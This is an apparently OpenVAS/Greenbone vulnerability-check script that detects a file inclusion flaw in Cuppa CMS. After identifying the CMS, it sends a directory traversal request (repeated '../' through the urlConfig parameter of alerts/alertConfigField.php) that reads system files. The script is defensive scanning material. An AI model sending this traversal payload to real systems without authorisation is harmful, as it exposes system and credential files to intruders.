if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803805" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.6" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-06-06 10:36:14 +0530 (Thu, 06 Jun 2013)" );
	script_name( "Cuppa CMS Remote/Local File Inclusion Vulnerability" );
	script_xref( name: "URL", value: "http://1337day.com/exploit/20855" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/25971" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/121881/cuppacms-rfi.txt" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/cuppa-cms-remote-local-file-inclusion" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to read
  or include arbitrary files from the local system using directory traversal
  sequences on the target system." );
	script_tag( name: "affected", value: "Cuppa CMS beta version 0.1" );
	script_tag( name: "insight", value: "Improper sanitation of user supplied input via 'urlConfig'
  parameter to 'alerts/alertConfigField.php' script." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is installed with Cuppa CMS and is prone to file
  inclusion vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/", "/cuppa", "/cms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: dir + "/index.php", port: port );
	if(rcvRes && ContainsString( rcvRes, ">Cuppa CMS" ) && ContainsString( rcvRes, "Username<" )){
		for file in keys( files ) {
			url = dir + "/alerts/alertConfigField.php?urlConfig=" + crap( data: "../", length: 3 * 15 ) + files[file];
			if(http_vuln_check( port: port, url: url, pattern: file )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

